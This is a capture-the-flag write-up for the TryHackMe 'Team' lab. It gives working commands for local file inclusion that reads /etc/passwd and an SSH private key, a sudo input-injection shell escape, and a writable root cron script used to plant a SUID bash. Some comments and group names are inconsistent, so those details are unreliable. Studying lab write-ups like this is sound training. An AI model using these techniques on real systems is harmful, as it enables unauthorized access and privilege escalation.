# Team - TryHackMe Writeup

**Target:** `TARGET_IP`
**Domain:** `team.thm`
**OS:** Linux (Ubuntu)
**Difficulty:** Easy

---

## Attack Chain Overview

```
Port Discovery (21, 22, 80)
    ↓
VHOST Enumeration → dev.team.thm
    ↓
LFI in script.php → /etc/passwd, /etc/vsftpd.conf
    ↓
Backup Script Exposed (script.old) → FTP Credentials
    ↓
LFI → /etc/ssh/sshd_config → Dale's Private Key
    ↓
SSH as dale → sudo as gyles (unsanitized date input in admin_checks)
    ↓
Admin group → Writable cron script (main_backup.sh) → SUID bash copy
    ↓
Root Flag
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [User Flag](#user-flag)
4. [Privilege Escalation — dale → gyles](#privilege-escalation--dale--gyles)
5. [Privilege Escalation — gyles → root](#privilege-escalation--gyles--root)
6. [Root Flag](#root-flag)
7. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Host Setup
```bash
# What it does: adds machine domains to /etc/hosts.
# Why here: resolve virtual hosts during web enumeration.
echo "TARGET_IP team.thm" | sudo tee -a /etc/hosts
```

### Port Discovery
```bash
# What it does: runs an Nmap scan with the specified ports/scripts/options.
# Why here: identify exposed services and decide on the next enumeration.
nmap -sS -p- --min-rate 5000 -n TARGET_IP
```

**Open ports:** `21` (FTP), `22` (SSH), `80` (HTTP)

### Service Enumeration
```bash
# What it does: runs an Nmap scan with the specified ports/scripts/options.
# Why here: identify exposed services and decide on the next enumeration.
nmap -sVC -p21,22,80 TARGET_IP -oA service-scan
```

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.5 |
| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
| 80 | HTTP | Apache 2.4.41 |

### Web Content Discovery
```bash
# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
# Why here: descubrir endpoints ocultos que abren la siguiente fase.
feroxbuster -u http://team.thm/ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
```

### VHOST Enumeration
```bash
# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
# Why here: descubrir endpoints ocultos que abren la siguiente fase.
gobuster vhost -u http://team.thm \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

**Discovered VHOSTs:**

| VHOST | Status | Size |
|-------|--------|------|
| `dev.team.thm` | 200 | 187 |
| `www.dev.team.thm` | 200 | 187 |

```bash
# What it does: adds machine domains to /etc/hosts.
# Why here: resolve virtual hosts during web enumeration.
echo "TARGET_IP dev.team.thm" | sudo tee -a /etc/hosts
```

---

## Initial Access

### LFI Discovery

Browsing `http://dev.team.thm/script.php` reveals a `page` parameter:

```
http://dev.team.thm/script.php?page=teamshare.php
```

**Test for LFI:**
```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl "http://dev.team.thm/script.php?page=/etc/passwd"
```

**Result:** Contents of `/etc/passwd` returned — LFI confirmed.

**Interesting users:**
```
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
```

### LFI Fuzzing
```bash
# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
# Why here: descubrir endpoints ocultos que abren la siguiente fase.
ffuf -u "http://dev.team.thm/script.php?page=FUZZ" \
  -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -c -t 50 -fw 1,18
```

### Recovering FTP Credentials via Backup Script

A scripts directory is accessible at `http://team.thm/scripts/`:

```bash
# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
# Why here: descubrir endpoints ocultos que abren la siguiente fase.
ffuf -u "http://team.thm/scripts/scriptFUZZ" \
  -w <(echo -e ".bak\n.old\n_backup\n.bkp\n~\n.txt\n.sh\n.orig\n.save") \
  -c -t 20 -fc 404
```

**Result:** `http://team.thm/scripts/script.old` found.

**Credentials extracted from `script.old`:**
- **FTP User:** `ftpuser`
- **FTP Password:** `T3@m$h@r3`

### Recovering Dale's SSH Private Key via LFI

```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl "http://dev.team.thm/script.php?page=/etc/ssh/sshd_config"
```

The SSH daemon config references Dale's private key stored on disk. Read it directly:

```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl "http://dev.team.thm/script.php?page=/home/dale/.ssh/id_rsa"
```

Save as `dale_id_rsa` and set correct permissions:
```bash
# What it does: changes permissions or owner.
# Why here: make a payload executable or control access to a file.
chmod 600 dale_id_rsa
```

### SSH as Dale
```bash
# What it does: opens an SSH session or tunnel with the specified options.
# Why here: obtain interactive shell or pivot to an internal service.
ssh -i dale_id_rsa dale@team.thm
```

**✅ Initial access achieved as `dale`.**

---

## User Flag

```bash
dale@team:~$ cat /home/dale/user.txt
```

---

## Privilege Escalation — dale → gyles

### Sudo Enumeration
```bash
# What it does: lists sudo privileges of the current or specified user.
# Why here: encontrar comandos permitidos para escalar privilegios.
sudo -l
```

**Result:**
```
User dale may run the following commands on ip-10-129-179-152:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

### Analyzing admin_checks

The script prompts for a date string and passes it without sanitization to a command. The `$error` variable in the date prompt is not sanitized, allowing command injection by entering a shell binary path.

### Exploitation
```bash
sudo -u gyles /home/gyles/admin_checks
```

When prompted for the date, enter:
```
/bin/bash
```

**Stabilize shell:**
```bash
# What it does: executes or compiles the script/program with the specified arguments.
# Why here: launch the necessary exploit or helper in this phase.
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**✅ Shell obtained as `gyles`.**

---

## Privilege Escalation — gyles → root

### Group Enumeration

Check `dale`'s group memberships (noted during initial enum):
```bash
id
# uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
```

`dale` belongs to the `editors` group. Find files owned by that group:
```bash
# What it does: searches the filesystem with the specified filters.
# Why here: locate credentials, binaries, configs or writable paths.
find / -group admin 2>/dev/null
```

**Key file:** `/opt/admin_stuff/script.sh`

```bash
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /opt/admin_stuff/script.sh
```

```bash
#!/bin/bash
#I have set a cronjob to run this script every minute
dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
```

This cronjob runs as **root** and calls `/usr/local/bin/main_backup.sh`, which is **writable by the `editors` group**.

### Writing Payload to Cron Script

```bash
# What it does: escribe un comando payload en un archivo o entrada vulnerable.
# Why here: convertir script/ruta escribible en ejecucion de codigo.
echo "cp /bin/bash /tmp/custom && chmod u+s /tmp/custom" >> /usr/local/bin/main_backup.sh
```

Wait up to one minute for the cron job to execute, then:

```bash
/tmp/custom -p
# What it does: executes a Windows command line action.
# Why here: enumerate, transfer, replace or validate artifacts on the victim.
whoami
# root
```

**✅ Root shell obtained.**

---

## Root Flag

```bash
root@team:/# cat /root/root.txt
```

---

## Key Takeaways

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Recon** | VHOST enumeration | `dev.team.thm` exposes hidden PHP script |
| **LFI** | `script.php?page=` parameter | Read `/etc/passwd`, SSH configs, private keys |
| **Cred Discovery** | Backup script exposure | `script.old` contained FTP credentials in cleartext |
| **Initial Access** | SSH private key via LFI | Dale's key readable through web server |
| **Lateral Movement** | Sudo unsanitized input | `/home/gyles/admin_checks` date prompt injection |
| **Privilege Escalation** | Writable cron script | `main_backup.sh` writable by `editors` group, runs as root |

### Security Lessons

1. **Never expose backup/old script files** — `.old`, `.bak` extensions should be blocked or removed
2. **Sanitize all user inputs** — even internal scripts that accept shell input are attack surfaces
3. **SSH private keys should never be world-readable** — key material in `/etc/ssh/` configs is sensitive
4. **Restrict cron script permissions** — scripts executed by root cron jobs must not be group-writable
5. **Apply the principle of least privilege to groups** — membership in `editors` or `admin` groups should be reviewed


